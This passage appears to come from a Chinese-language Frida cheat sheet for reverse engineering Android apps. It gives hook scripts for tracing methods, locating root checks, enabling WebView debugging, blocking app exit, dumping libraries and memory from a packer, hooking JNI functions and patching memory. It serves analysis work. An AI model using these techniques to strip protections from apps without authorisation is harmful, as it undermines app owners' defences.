console.log(); for (var j = 0; j &lt; arguments.length; j++) &#123; console.log(\"arg[\" + j + \"]: \" + arguments[j]); &#125; // print retval var retval = this[targetMethod].apply(this, arguments); // rare crash (Frida bug?) console.log(\"\\nretval: \" + retval); console.warn(\"\\n*** exiting \" + targetClassMethod); return retval; &#125; &#125;&#125;// trace Module functionsfunction traceModule(impl, name)&#123; console.log(\"Tracing \" + name); Interceptor.attach(impl, &#123; onEnter: function(args) &#123; // debug only the intended calls this.flag = false; // var filename = Memory.readCString(ptr(args[0])); // if (filename.indexOf(\"XYZ\") === -1 &amp;&amp; filename.indexOf(\"ZYX\") === -1) // exclusion list // if (filename.indexOf(\"my.interesting.file\") !== -1) // inclusion list this.flag = true; if (this.flag) &#123; console.warn(\"\\n*** entered \" + name); // print backtrace console.log(\"\\nBacktrace:\\n\" + Thread.backtrace(this.context, Backtracer.ACCURATE) .map(DebugSymbol.fromAddress).join(\"\\n\")); &#125; &#125;, onLeave: function(retval) &#123; if (this.flag) &#123; // print retval console.log(\"\\nretval: \" + retval); console.warn(\"\\n*** exiting \" + name); &#125; &#125; &#125;);&#125;// remove duplicates from arrayfunction uniqBy(array, key)&#123; var seen = &#123;&#125;; return array.filter(function(item) &#123; var k = key(item); return seen.hasOwnProperty(k) ? false : (seen[k] = true); &#125;);&#125;// usage examplessetTimeout(function() &#123; // avoid java.lang.ClassNotFoundException Java.perform(function() &#123; // trace(\"com.target.utils.CryptoUtils.decrypt\"); // trace(\"com.target.utils.CryptoUtils\"); // trace(\"CryptoUtils\"); // trace(/crypto/i); // trace(\"exports:*!open*\"); &#125;); &#125;, 0);# 打印堆栈信息 假设某个 app 有检查机制，会侦测是不是有 root，然后原始码经过混淆所以比较难追踪，但是在检查时会用 Log.d 输出检查相关资讯，这时候我们可以 hook Log.d，并且利用 Log.getStackTraceString 输出 stack trace，就能知道是在哪边呼叫这个 function var Log = Java.use(\"android.util.Log\");var Exception = Java.use(\"java.lang.Exception\");Log.d.overload(\"java.lang.String\", \"java.lang.String\").implementation = function (a, b) &#123; // 发现输出 root 的 Log 时 if (b.indexOf('root') >= 0) &#123; // 打印 stack trace 方便追踪 console.log(Java.use(\"android.util.Log\").getStackTraceString(Java.use(\"java.lang.Exception\").$new())); &#125; return this.d.overload(\"java.lang.String\", \"java.lang.String\").call(this, a, b)&#125;;# 混淆方法名的 hook 如果类名和方法名都是不可见的字符，那么我们可以先把这些不可见字符以 URL编码 ，然后用 js 的函数 decodeURIComponent 进行解码 // 假设我们 URLEncode 过后的混淆方法名为：% EE% A0%91，类名为：% EE% A0%94% EE% A0%94% EE% A0%94% EE% A0// 那我们要 Hook 这个方法，可以像以下写法// 取混淆类名的类var obj = Java.use(decodeURIComponent(\"%EE%A0%94%EE%A0%94%EE%A0%94%EE%A0\"));// 通过 obj [] 方式来定位到方法，在里面通过 decodeURIComponent () 解码我们混淆的方法名obj[decodeURIComponent(\"%EE%A0%91\")].implementation = function()&#123; //do hook // 如果我们想要调用该类另外一个混淆的方法 % EE% A0%94% EE% A0%91% EE。那么可以如下操作： this[decodeURIComponent(\"%EE%A0%94%EE%A0%91%EE\")](参数);&#125;如果要 hook 的方法名是带有美元 $ 符号的类似与 s.sdd.$$c , 那么在 hook 这个方法的时候，前面要加上下划线 _ 才可以正常 hook var sdd = Java.use(\"s.sdd\");sdd._$$c.implementation = function (a,b, c) &#123; var ret = mSS._$$c(a,b,c); return ret;&#125;# 利用 java 的反射机制打印方法 什么是 java 的反射机制？ 反射机制是指在编译阶段不知道是哪个类被加载，而是在运行的时候才加载、执行。 也就是说，反射机制指的是程序在运行时能够获取自身的信息。 js 中的 apply 就是反射机制。 类 ParametersTest public class ParametersTest &#123; private final int count = 523;// 字段 count private final String plainText = \"this is a test\";// 字段 plainText public int multiply(int val1,int val2)&#123; return val1 * val2; &#125; public byte multiply(byte val1,byte val2)&#123; return (byte)(val1 * val2); &#125; public short multiply(short val1,short val2)&#123; return (short)(val1 * val2); &#125; public long multiply(long val1,long val2)&#123; return val1 * val2; &#125; public float multiply(float val1,float val2)&#123; return val1 * val2; &#125; public double multiply(double val1,double val2)&#123; return val1 * val2; &#125; public String addMethod(String str1,String str2)&#123; return str1 + str2; &#125; public void addMethod(int[] initArray)&#123; for(int i = 0; i &lt; initArray.length;i++)&#123; initArray[i] = initArray[i] + 1; &#125; &#125; public void addMethod(byte[] byteArray)&#123; for(int i = 0; i &lt; byteArray.length;i++)&#123; byteArray[i] = (byte)(byteArray[i] + 1); &#125; &#125; public void addMethod(long[] longArray)&#123; for(int i = 0; i &lt; longArray.length; i++)&#123; longArray[i] = longArray[i] + 1; &#125; &#125; public void addMethod(float[] floatArray)&#123; for(int i = 0; i &lt; floatArray.length; i++)&#123; floatArray[i] = floatArray[i] + 1; &#125; &#125; public void addMethod(double[] doubleArray)&#123; for(int i = 0; i &lt; doubleArray.length; i++)&#123; doubleArray[i] = doubleArray[i] + 1; &#125; &#125; public void addMethod(String[] strArray)&#123; String result = \"\"; for(int i = 0; i &lt; strArray.length; i++)&#123; result = result + strArray[i]; &#125; &#125; //display 方法参数为 ParametersTest 对象 public void display(ParametersTest parametersTest)&#123; int[] intArray = &#123;1,2,3,4,5&#125;; parametersTest.addMethod(intArray); byte[] byteArray = &#123;0x10,0x11,0x12,0x13&#125;; parametersTest.addMethod(byteArray); long[] longArray = &#123;0x1,0x2,0x3,0x4&#125;; parametersTest.addMethod(longArray); String[] strArray = &#123;\"abcde\",\"1222CDedd\",\"12daer\",\"cder\"&#125;; parametersTest.addMethod(strArray); float[] floatArray = &#123;0x1,0x2,0x3,0x4&#125;; parametersTest.addMethod(floatArray); double[] doubleArray = &#123;0x1,0x2,0x3,0x4&#125;; parametersTest.addMethod(doubleArray); String str1 = \"acerwe\"; String str2 = \"werwed\"; parametersTest.addMethod(str1,str2); int intVal1 = 3; int intVal2 = 4; int retInt = parametersTest.multiply(intVal1,intVal2); byte byteVal1 = 0x1; byte byteVal2 = 0x2; byte retByte = parametersTest.multiply(byteVal1,byteVal2); long longVal1 = 0x3; long longVal2 = 0x4; long retLong = parametersTest.multiply(longVal1,longVal2); float floatVal1 = 0x3; float floatVal2 = 0x4; float retFloat = parametersTest.multiply(floatVal1,floatVal2); short shortVal1 = 0x3; short shortVal2 = 0x4; short retShort = parametersTest.multiply(shortVal1,shortVal2); double doubleVal1 = 0x3; double doubleVal2 = 0x4; double retDouble = parametersTest.multiply(doubleVal1,doubleVal2); &#125;&#125;frida 脚本 function getReflectFields(val1) &#123; var clazz = Java.use(\"java.lang.Class\"); var parametersTest = Java.cast(val1.getClass(),clazz); //getDeclaredFields ()：返回反映由类对象表示的类或接口声明的所有字段的字段对象数组，也可以简单的理解为会返回这个类所有的对象 var fields = parametersTest.getDeclaredFields(); fields.forEach(function (field) &#123;// 依次打印字段的类型、名称、值 send(\"field type is: \" + (field.getType())); send(\"field name is: \" + (field.getName())); send(\"field value is: \" + field.get(val1)); &#125;)&#125;function getReflectMethod(val1) &#123; try&#123; var clazz = Java.use(\"java.lang.Class\");// 使用 java 的 Class 类 var parametersTest = Java.cast(val1.getClass(),clazz);// 类型转换，将 //getDeclaredMethods () 获取所有方法 var methods = parametersTest.getDeclaredMethods(); methods.forEach(function (method) &#123; var methodName = method.getName(); var val1Class = val1.getClass(); var val1ClassName = Java.use(val1Class.getName()); var overloads = val1ClassName[methodName].overloads; overloads.forEach(function (overload) &#123; var proto = \"(\"; overload.argumentTypes.forEach(function (type) &#123; proto += type.className + \", \"; &#125;); if(proto.length > 1)&#123; proto = proto.substr(0 ,proto.length - 2); &#125; proto += \")\"; overload.implementation = function () &#123; var args = []; for(var j = 0; j &lt; arguments.length; j++)&#123; for(var i in arguments[j])&#123; var value = String(arguments[j][i]); send(val1ClassName + \".\" + methodName + \" and arguments value is: \" + value); &#125; args[j] = arguments[j] + \"\"; &#125; // 打印方法参数 send(val1ClassName + \".\" + methodName + \" and args is: \" + args); // 调用方法 var retval = this[methodName].apply(this,arguments); // 打印方法返回值 send(methodName + \" return value is: \" + retval); return retval;// 返回方法返回值 &#125; &#125;) &#125;) &#125;catch(e)&#123; send(\"'\" + val1 + \"' hook fail: \" + e); &#125; &#125;//hook parametersTestClass 类的 display 方法parametersTestClass.display.overload(\"com.example.parameterstest.ParametersTest\").implementation = function (val1) &#123; getReflectFields(val1);// 打印所有字段（fields）类型、名称、值 getReflectMethod(val1)//hook ParametersTest 对象的所有方法 this.display(val1);// 调用 display 方法&#125;# 开启 webview 的 debug 调试 function webview_debug() &#123; Java.perform(function () &#123; var WebView = Java.use('android.webkit.WebView'); WebView.$init.overloads.forEach(function(init) &#123; init.implementation = function() &#123; // 调用原始构造方法 var instance = init.apply(this, arguments); // 打开 WebView 的调试功能 WebView.setWebContentsDebuggingEnabled(true); console.log('[*] WebView debug open~'); // 返回实例 return instance; &#125;; &#125;); &#125;);&#125;# hook 进程退出 function hook_exit() &#123; Java.perform(function () &#123; try &#123; var Process = Java.use(\"android.os.Process\"); Process.killProcess.implementation = function(pid)&#123; console.log(\"Process.killProcess not implement!\",pid); return; &#125; var exitClass = Java.use(\"java.lang.System\"); exitClass.exit.implementation = function () &#123; console.log(\"[*] System.exit called\"); return; &#125; &#125; catch (e) &#123; console.log('exitClass err', e) &#125; &#125;);&#125;# hook 弹窗 function hook_alert()&#123; if(Java.available)&#123; Java.perform(function()&#123; const alert = Java.use(\"android.app.Dialog\"); alert.show.overload().implementation = function()&#123; console.log('call alert'); var Log = Java.use(\"android.util.Log\"); var Exception = Java.use(\"java.lang.Exception\"); console.log(Log.getStackTraceString(Exception.$new())); return this.show(); &#125; &#125;) &#125;&#125;# native 层 # dump 内存中的 so function dump_so(so_name) &#123; Java.perform(function () &#123; var currentApplication = Java.use(\"android.app.ActivityThread\").currentApplication(); var dir = currentApplication.getApplicationContext().getFilesDir().getPath(); var libso = Process.getModuleByName(so_name); console.log(\"[name]:\", libso.name); console.log(\"[base]:\", libso.base); console.log(\"[size]:\", ptr(libso.size)); console.log(\"[path]:\", libso.path); var file_path = dir + \"/\" + libso.name + \"_\" + libso.base + \"_\" + ptr(libso.size) + \".so\"; var file_handle = new File(file_path, \"wb\"); if (file_handle &amp;&amp; file_handle != null) &#123; Memory.protect(ptr(libso.base), libso.size, 'rwx'); var libso_buffer = ptr(libso.base).readByteArray(libso.size); file_handle.write(libso_buffer); file_handle.flush(); file_handle.close(); console.log(\"[dump]:\", file_path); &#125; &#125;);&#125;rpc.exports = &#123; dump_so: dump_so&#125;;# dump 内存 function dump_memory(start,size,filename) &#123; var file_path = \"/data/data/com.oacia.apk_protect/\" + filename; var file_handle = new File(file_path, \"wb\"); if (file_handle &amp;&amp; file_handle != null) &#123; var libso_buffer = start.readByteArray(size.toUInt32()); file_handle.write(libso_buffer); file_handle.flush(); file_handle.close(); console.log(\"[dump]:\", file_path); &#125;&#125;# hook native 层的函数 function hook_native()&#123; var module = Process.findModuleByName(\"libjiagu_64.so\"); Interceptor.attach(module.base.add(0x131E20), &#123; onEnter: function (args) &#123; console.log(\"hook success!\") console.log(args[1]) console.log(args[2]) console.log(args[3]) &#125;, onLeave: function (ret) &#123; &#125; &#125;);&#125;# hook 导出函数 function hook_export() &#123; Interceptor.attach(Module.findExportByName(\"libc.so\", \"pthread_create\"),&#123; onEnter(args)&#123; console.log(\"hook success\"); &#125;, onLeave: function (retval) &#123; &#125; &#125;)&#125;# hook jni 函数 我们可以现在这个地方找到 jni 函数的含义，然后根据函数参数的类型去定制化输出的打印 //hook GetStaticMethodID function hook_libart() &#123; var symbols = Module.enumerateSymbolsSync(\"libart.so\"); var addr_jni = null; for (var i = 0; i &lt; symbols.length; i++) &#123; var symbol = symbols[i]; if (symbol.name.indexOf(\"GetStaticMethodID\")!=-1) &#123; addr_jni = symbol.address; console.log(\"find \",symbol.name); console.log(\"[+] hook \",addr_jni); Interceptor.attach(addr_jni, &#123; onEnter: function (args) &#123; console.log(\"call GetStaticMethodID: \",symbol.name); console.log(\"class: \",Java.vm.tryGetEnv().getClassName(args[1])); console.log(\"name: \",args[2].readCString()); console.log(\"sig: \",args[3].readCString()); &#125;, onLeave: function (retval) &#123; console.log(\"return val\") console.log(retval); &#125; &#125;); &#125; &#125;&#125;# hook libart https://github.com/lasting-yang/frida_hook_libart 对常见的 art 函数 ( GetStringUTFChars , NewStringUTF , FindClass , GetMethodID , GetStaticMethodID , GetFieldID , GetStaticFieldID , RegisterNatives , CallStatic , CallNonvirtual ) 进行 hook, 这几个 art 函数在大型 APP 的逆向中定位加密参数的位置很有帮助 const STD_STRING_SIZE = 3 * Process.pointerSize;class StdString &#123; constructor() &#123; this.handle = Memory.alloc(STD_STRING_SIZE); &#125; dispose() &#123; const [data, isTiny] = this._getData(); if (!isTiny) &#123; Java.api.$delete(data); &#125; &#125; disposeToString() &#123; const result = this.toString(); this.dispose(); return result; &#125; toString() &#123; const [data] = this._getData(); return data.readUtf8String(); &#125; _getData() &#123; const str = this.handle; const isTiny = (str.readU8() &amp; 1) === 0; const data = isTiny ? str.add(1) : str.add(2 * Process.pointerSize).readPointer(); return [data, isTiny]; &#125;&#125;function prettyMethod(method_id, withSignature) &#123; const result = new StdString(); Java.api['art::ArtMethod::PrettyMethod'](result, method_id, withSignature ? 1 : 0); return result.disposeToString();&#125;/*GetFieldID is at 0xe39b87c5 _ZN3art3JNI10GetFieldIDEP7_JNIEnvP7_jclassPKcS6_GetMethodID is at 0xe39a1a19 _ZN3art3JNI11GetMethodIDEP7_JNIEnvP7_jclassPKcS6_NewStringUTF is at 0xe39cff25 _ZN3art3JNI12NewStringUTFEP7_JNIEnvPKcRegisterNatives is at 0xe39e08fd _ZN3art3JNI15RegisterNativesEP7_JNIEnvP7_jclassPK15JNINativeMethodiGetStaticFieldID is at 0xe39c9635 _ZN3art3JNI16GetStaticFieldIDEP7_JNIEnvP7_jclassPKcS6_GetStaticMethodID is at 0xe39be0ed _ZN3art3JNI17GetStaticMethodIDEP7_JNIEnvP7_jclassPKcS6_GetStringUTFChars is at 0xe39d06e5 _ZN3art3JNI17GetStringUTFCharsEP7_JNIEnvP8_jstringPhFindClass is at 0xe399ae5d _ZN3art3JNI9FindClassEP7_JNIEnvPKc*/function hook_libart() &#123; var symbols = Module.enumerateSymbolsSync(\"libart.so\"); var addrGetStringUTFChars = null; var addrNewStringUTF = null; var addrFindClass = null; var addrGetMethodID = null; var addrGetStaticMethodID = null; var addrGetFieldID = null; var addrGetStaticFieldID = null; var addrRegisterNatives = null; var so_name = \"lib\"; //TODO 这里写需要过滤的 so for (var i = 0; i &lt; symbols.length; i++) &#123; var symbol = symbols[i]; if (symbol.name.indexOf(\"art\") >= 0 &amp;&amp; symbol.name.indexOf(\"JNI\") >= 0 &amp;&amp; symbol.name.indexOf(\"CheckJNI\") &lt; 0 &amp;&amp; symbol.name.indexOf(\"_ZN3art3JNIILb0\") >= 0 ) &#123; if (symbol.name.indexOf(\"GetStringUTFChars\") >= 0) &#123; addrGetStringUTFChars = symbol.address; console.log(\"GetStringUTFChars is at \", symbol.address, symbol.name); &#125; else if (symbol.name.indexOf(\"NewStringUTF\") >= 0) &#123; addrNewStringUTF = symbol.address; console.log(\"NewStringUTF is at \", symbol.address, symbol.name); &#125; else if (symbol.name.indexOf(\"FindClass\") >= 0) &#123; addrFindClass = symbol.address; console.log(\"FindClass is at \", symbol.address, symbol.name); &#125; else if (symbol.name.indexOf(\"GetMethodID\") >= 0) &#123; addrGetMethodID = symbol.address; console.log(\"GetMethodID is at \", symbol.address, symbol.name); &#125; else if (symbol.name.indexOf(\"GetStaticMethodID\") >= 0) &#123; addrGetStaticMethodID = symbol.address; console.log(\"GetStaticMethodID is at \", symbol.address, symbol.name); &#125; else if (symbol.name.indexOf(\"GetFieldID\") >= 0) &#123; addrGetFieldID = symbol.address; console.log(\"GetFieldID is at \", symbol.address, symbol.name); &#125; else if (symbol.name.indexOf(\"GetStaticFieldID\") >= 0) &#123; addrGetStaticFieldID = symbol.address; console.log(\"GetStaticFieldID is at \", symbol.address, symbol.name); &#125; else if (symbol.name.indexOf(\"RegisterNatives\") >= 0) &#123; addrRegisterNatives = symbol.address; console.log(\"RegisterNatives is at \", symbol.address, symbol.name); &#125; else if (symbol.name.indexOf(\"CallStatic\") >= 0) &#123; console.log(\"CallStatic is at \", symbol.address, symbol.name); Interceptor.attach(symbol.address, &#123; onEnter: function (args) &#123; var module = Process.findModuleByAddress(this.returnAddress); if (module != null &amp;&amp; module.name.indexOf(so_name) == 0) &#123; var java_class = args[1]; var mid = args[2]; var class_name = Java.vm.tryGetEnv().getClassName(java_class); if (class_name.indexOf(\"java.\") == -1 &amp;&amp; class_name.indexOf(\"android.\") == -1) &#123; var method_name = prettyMethod(mid, 1); console.log(\"&lt;>CallStatic:\", DebugSymbol.fromAddress(this.returnAddress), class_name, method_name); &#125; &#125; &#125;, onLeave: function (retval) &#123; &#125; &#125;); &#125; else if (symbol.name.indexOf(\"CallNonvirtual\") >= 0) &#123; console.log(\"CallNonvirtual is at \", symbol.address, symbol.name); Interceptor.attach(symbol.address, &#123; onEnter: function (args) &#123; var module = Process.findModuleByAddress(this.returnAddress); if (module != null &amp;&amp; module.name.indexOf(so_name) == 0) &#123; var jobject = args[1]; var jclass = args[2]; var jmethodID = args[3]; var obj_class_name = Java.vm.tryGetEnv().getObjectClassName(jobject); var class_name = Java.vm.tryGetEnv().getClassName(jclass); if (class_name.indexOf(\"java.\") == -1 &amp;&amp; class_name.indexOf(\"android.\") == -1) &#123; var method_name = prettyMethod(jmethodID, 1); console.log(\"&lt;>CallNonvirtual:\", DebugSymbol.fromAddress(this.returnAddress), class_name, obj_class_name, method_name); &#125; &#125; &#125;, onLeave: function (retval) &#123; &#125; &#125;); &#125; else if (symbol.name.indexOf(\"Call\") >= 0 &amp;&amp; symbol.name.indexOf(\"Method\") >= 0) &#123; console.log(\"Call&lt;>Method is at \", symbol.address, symbol.name); Interceptor.attach(symbol.address, &#123; onEnter: function (args) &#123; var module = Process.findModuleByAddress(this.returnAddress); if (module != null &amp;&amp; module.name.indexOf(so_name) == 0) &#123; var java_class = args[1]; var mid = args[2]; var class_name = Java.vm.tryGetEnv().getObjectClassName(java_class); if (class_name.indexOf(\"java.\") == -1 &amp;&amp; class_name.indexOf(\"android.\") == -1) &#123; var method_name = prettyMethod(mid, 1); console.log(\"&lt;>Call&lt;>Method:\", DebugSymbol.fromAddress(this.returnAddress), class_name, method_name); &#125; &#125; &#125;, onLeave: function (retval) &#123; &#125; &#125;); &#125; &#125; &#125; if (addrGetStringUTFChars != null) &#123; Interceptor.attach(addrGetStringUTFChars, &#123; onEnter: function (args) &#123; &#125;, onLeave: function (retval) &#123; if (retval != null) &#123; var module = Process.findModuleByAddress(this.returnAddress); if (module != null &amp;&amp; module.name.indexOf(so_name) == 0) &#123; var bytes = Memory.readCString(retval); console.log(\"[GetStringUTFChars] result:\" + bytes, DebugSymbol.fromAddress(this.returnAddress)); &#125; &#125; &#125; &#125;); &#125; if (addrNewStringUTF != null) &#123; Interceptor.attach(addrNewStringUTF, &#123; onEnter: function (args) &#123; if (args[1] != null) &#123; var module = Process.findModuleByAddress(this.returnAddress); if (module != null &amp;&amp; module.name.indexOf(so_name) == 0) &#123; var string = Memory.readCString(args[1]); console.log(\"[NewStringUTF] bytes:\" + string, DebugSymbol.fromAddress(this.returnAddress)); &#125; &#125; &#125;, onLeave: function (retval) &#123; &#125; &#125;); &#125; if (addrFindClass != null) &#123; Interceptor.attach(addrFindClass, &#123; onEnter: function (args) &#123; if (args[1] != null) &#123; var module = Process.findModuleByAddress(this.returnAddress); if (module != null &amp;&amp; module.name.indexOf(so_name) == 0) &#123; var name = Memory.readCString(args[1]); console.log(\"[FindClass] name:\" + name, DebugSymbol.fromAddress(this.returnAddress)); &#125; &#125; &#125;, onLeave: function (retval) &#123; &#125; &#125;); &#125; if (addrGetMethodID != null) &#123; Interceptor.attach(addrGetMethodID, &#123; onEnter: function (args) &#123; if (args[2] != null) &#123; var clazz = args[1]; var class_name = Java.vm.tryGetEnv().getClassName(clazz); var module = Process.findModuleByAddress(this.returnAddress); if (module != null &amp;&amp; module.name.indexOf(so_name) == 0) &#123; var name = Memory.readCString(args[2]); if (args[3] != null) &#123; var sig = Memory.readCString(args[3]); console.log(\"[GetMethodID] class_name:\" + class_name + \" name:\" + name + \", sig:\" + sig, DebugSymbol.fromAddress(this.returnAddress)); &#125; else &#123; console.log(\"[GetMethodID] class_name:\" + class_name + \" name:\" + name, DebugSymbol.fromAddress(this.returnAddress)); &#125; &#125; &#125; &#125;, onLeave: function (retval) &#123; &#125; &#125;); &#125; if (addrGetStaticMethodID != null) &#123; Interceptor.attach(addrGetStaticMethodID, &#123; onEnter: function (args) &#123; if (args[2] != null) &#123; var clazz = args[1]; var class_name = Java.vm.tryGetEnv().getClassName(clazz); var module = Process.findModuleByAddress(this.returnAddress); if (module != null &amp;&amp; module.name.indexOf(so_name) == 0) &#123; var name = Memory.readCString(args[2]); if (args[3] != null) &#123; var sig = Memory.readCString(args[3]); console.log(\"[GetStaticMethodID] class_name:\" + class_name + \" name:\" + name + \", sig:\" + sig, DebugSymbol.fromAddress(this.returnAddress)); &#125; else &#123; console.log(\"[GetStaticMethodID] class_name:\" + class_name + \" name:\" + name, DebugSymbol.fromAddress(this.returnAddress)); &#125; &#125; &#125; &#125;, onLeave: function (retval) &#123; &#125; &#125;); &#125; if (addrGetFieldID != null) &#123; Interceptor.attach(addrGetFieldID, &#123; onEnter: function (args) &#123; if (args[2] != null) &#123; var module = Process.findModuleByAddress(this.returnAddress); if (module != null &amp;&amp; module.name.indexOf(so_name) == 0) &#123; var name = Memory.readCString(args[2]); if (args[3] != null) &#123; var sig = Memory.readCString(args[3]); console.log(\"[GetFieldID] name:\" + name + \", sig:\" + sig, DebugSymbol.fromAddress(this.returnAddress)); &#125; else &#123; console.log(\"[GetFieldID] name:\" + name, DebugSymbol.fromAddress(this.returnAddress)); &#125; &#125; &#125; &#125;, onLeave: function (retval) &#123; &#125; &#125;); &#125; if (addrGetStaticFieldID != null) &#123; Interceptor.attach(addrGetStaticFieldID, &#123; onEnter: function (args) &#123; if (args[2] != null) &#123; var module = Process.findModuleByAddress(this.returnAddress); if (module != null &amp;&amp; module.name.indexOf(so_name) == 0) &#123; var name = Memory.readCString(args[2]); if (args[3] != null) &#123; var sig = Memory.readCString(args[3]); console.log(\"[GetStaticFieldID] name:\" + name + \", sig:\" + sig, DebugSymbol.fromAddress(this.returnAddress)); &#125; else &#123; console.log(\"[GetStaticFieldID] name:\" + name, DebugSymbol.fromAddress(this.returnAddress)); &#125; &#125; &#125; &#125;, onLeave: function (retval) &#123; &#125; &#125;); &#125; if (addrRegisterNatives != null) &#123; Interceptor.attach(addrRegisterNatives, &#123; onEnter: function (args) &#123; console.log(\"[RegisterNatives] method_count:\", args[3], DebugSymbol.fromAddress(this.returnAddress)); var env = args[0]; var java_class = args[1]; var class_name = Java.vm.tryGetEnv().getClassName(java_class); var methods_ptr = ptr(args[2]); var method_count = parseInt(args[3]); for (var i = 0; i &lt; method_count; i++) &#123; var name_ptr = Memory.readPointer(methods_ptr.add(i * Process.pointerSize * 3)); var sig_ptr = Memory.readPointer(methods_ptr.add(i * Process.pointerSize * 3 + Process.pointerSize)); var fnPtr_ptr = Memory.readPointer(methods_ptr.add(i * Process.pointerSize * 3 + Process.pointerSize * 2)); var name = Memory.readCString(name_ptr); var sig = Memory.readCString(sig_ptr); var find_module = Process.findModuleByAddress(fnPtr_ptr); console.log(\"[RegisterNatives] java_class:\", class_name, \"name:\", name, \"sig:\", sig, \"fnPtr:\", fnPtr_ptr, \"module_name:\", find_module.name, \"module_base:\", find_module.base, \"offset:\", ptr(fnPtr_ptr).sub(find_module.base)); &#125; &#125;, onLeave: function (retval) &#123; &#125; &#125;); &#125;&#125;setImmediate(hook_libart);# hook RegisterNatives 定位 RegisterNatives 函数动态注册的位置 方法一 从 libart 中读取 RegisterNatives 地址 https://github.com/lasting-yang/frida_hook_libart/blob/master/hook_RegisterNatives.js function find_RegisterNatives(params) &#123; let symbols = Module.enumerateSymbolsSync(\"libart.so\"); let addrRegisterNatives = null; for (let i = 0; i &lt; symbols.length; i++) &#123; let symbol = symbols[i]; //_ZN3art3JNI15RegisterNativesEP7_JNIEnvP7_jclassPK15JNINativeMethodi if (symbol.name.indexOf(\"art\") >= 0 &amp;&amp; symbol.name.indexOf(\"JNI\") >= 0 &amp;&amp; symbol.name.indexOf(\"RegisterNatives\") >= 0 &amp;&amp; symbol.name.indexOf(\"CheckJNI\") &lt; 0) &#123; addrRegisterNatives = symbol.address; console.log(\"RegisterNatives is at \", symbol.address, symbol.name); hook_RegisterNatives(addrRegisterNatives) &#125; &#125;&#125;function hook_RegisterNatives(addrRegisterNatives) &#123; if (addrRegisterNatives != null) &#123; Interceptor.attach(addrRegisterNatives, &#123; onEnter: function (args) &#123; console.log(\"[RegisterNatives] method_count:\", args[3]); let java_class = args[1]; let class_name = Java.vm.tryGetEnv().getClassName(java_class); //console.log(class_name); let methods_ptr = ptr(args[2]); let method_count = parseInt(args[3]); for (let i = 0; i &lt; method_count; i++) &#123; let name_ptr = Memory.readPointer(methods_ptr.add(i * Process.pointerSize * 3)); let sig_ptr = Memory.readPointer(methods_ptr.add(i * Process.pointerSize * 3 + Process.pointerSize)); let fnPtr_ptr = Memory.readPointer(methods_ptr.add(i * Process.pointerSize * 3 + Process.pointerSize * 2)); let name = Memory.readCString(name_ptr); let sig = Memory.readCString(sig_ptr); let symbol = DebugSymbol.fromAddress(fnPtr_ptr) console.log(\"[RegisterNatives] java_class:\", class_name, \"name:\", name, \"sig:\", sig, \"fnPtr:\", fnPtr_ptr, \" fnOffset:\", symbol, \" callee:\", DebugSymbol.fromAddress(this.returnAddress)); &#125; &#125; &#125;); &#125;&#125;setImmediate(find_RegisterNatives);方法二 从 JNIEnv 中读取 RegisterNatives 地址 function getModuleInfoByPtr(fnPtr) &#123; var modules = Process.enumerateModules(); var modname = null, base = null; modules.forEach(function (mod) &#123; if (mod.base &lt;= fnPtr &amp;&amp; fnPtr.toInt32() &lt;= mod.base.toInt32() + mod.size) &#123; modname = mod.name; base = mod.base; return false; &#125; &#125;); return [modname, base];&#125;function hook_registNatives() &#123; var env = Java.vm.getEnv(); var handlePointer = env.handle.readPointer(); console.log(\"handle: \" + handlePointer); var nativePointer = handlePointer.add(215 * Process.pointerSize).readPointer(); console.log(\"register: \" + nativePointer); /** typedef struct &#123; const char* name; const char* signature; void* fnPtr; &#125; JNINativeMethod; jint RegisterNatives(JNIEnv* env, jclass clazz, const JNINativeMethod* methods, jint nMethods) */ Interceptor.attach(nativePointer, &#123; onEnter: function onEnter(args) &#123; var env = Java.vm.getEnv(); var p_size = Process.pointerSize; var methods = args[2]; var methodcount = args[3].toInt32(); var name = env.getClassName(args[1]); console.log(\"==== class: \" + name + \" ====\"); console.log(\"==== methods: \" + methods + \" nMethods: \" + methodcount + \" ====\"); for (var i = 0; i &lt; methodcount; i++) &#123; var idx = i * p_size * 3; var fnPtr = methods.add(idx + p_size * 2).readPointer(); var infoArr = getModuleInfoByPtr(fnPtr); var modulename = infoArr[0]; var modulebase = infoArr[1]; var logstr = \"name: \" + methods.add(idx).readPointer().readCString() + \", signature: \" + methods.add(idx + p_size).readPointer().readCString() + \", fnPtr: \" + fnPtr + \", modulename: \" + modulename + \" -> base: \" + modulebase; if (null != modulebase) &#123; logstr += \", offset: \" + fnPtr.sub(modulebase); &#125; console.log(logstr); &#125; &#125; &#125;);&#125;方法三 当这两种方法都 hook 不到的时候使用 告别 RegisterNatives 获取 JNI 函数绑定的地址，迎接最底层的方式获取 # 批量 hook native 函数 const soName = \"libtest.so\"const reg_native_list = [[\"o.DDY.a\",0xc4fac],[\"o.xSX.d\",0x92c8c]]function breakPoints()&#123; const soAddr = Module.findBaseAddress(soName); Java.perform(function()&#123; for(var i=0;i&lt;reg_native_list.length;i++)&#123; funcTmp(soAddr.add(reg_native_list[i][1]),reg_native_list[i][0]); console.log('prepare for name',reg_native_list[i][0],'offset',reg_native_list[i][1]); &#125; &#125;) function funcTmp(currentAddr,name)&#123; Interceptor.attach(currentAddr, &#123; onEnter: function(args)&#123; console.log(\"called : \"+name+\" ----- addr : \" + currentAddr.sub(soAddr)); &#125;, onLeave: function(retval)&#123; &#125; &#125;); &#125;&#125;# 枚举所有 so function enum_so()&#123; Java.perform(function()&#123; // 枚举当前加载的模块 var process_Obj_Module_Arr = Process.enumerateModules(); for(var i = 0; i &lt; process_Obj_Module_Arr.length; i++) &#123; // 包含 \"lib\" 字符串的 if(process_Obj_Module_Arr[i].path.indexOf(\"lib\")!=-1) &#123; console.log(\"模块名称:\",process_Obj_Module_Arr[i].name); console.log(\"模块地址:\",process_Obj_Module_Arr[i].base); console.log(\"大小:\",process_Obj_Module_Arr[i].size); console.log(\"文件系统路径\",process_Obj_Module_Arr[i].path); &#125; &#125; &#125;);&#125;# 查询地址在哪个 so 中 function addr_in_so(addr)&#123; var process_Obj_Module_Arr = Process.enumerateModules(); for(var i = 0; i &lt; process_Obj_Module_Arr.length; i++) &#123; if(addr>process_Obj_Module_Arr[i].base &amp;&amp; addr&lt;process_Obj_Module_Arr[i].base.add(process_Obj_Module_Arr[i].size))&#123; console.log(addr.toString(16),\"is in\",process_Obj_Module_Arr[i].name,\"offset: 0x\"+(addr-process_Obj_Module_Arr[i].base).toString(16)); &#125; &#125;&#125;# patch 内存 方法一 该方法存在两个问题 是否存在多线程操纵目标地址处的内存？是否有冲突？ arm 的缓存刷新机制 var str_name_so = \"libhookinunidbg.so\"; // 要 hook 的 so 名var n_addr_func_offset = 0x8CA; // 要 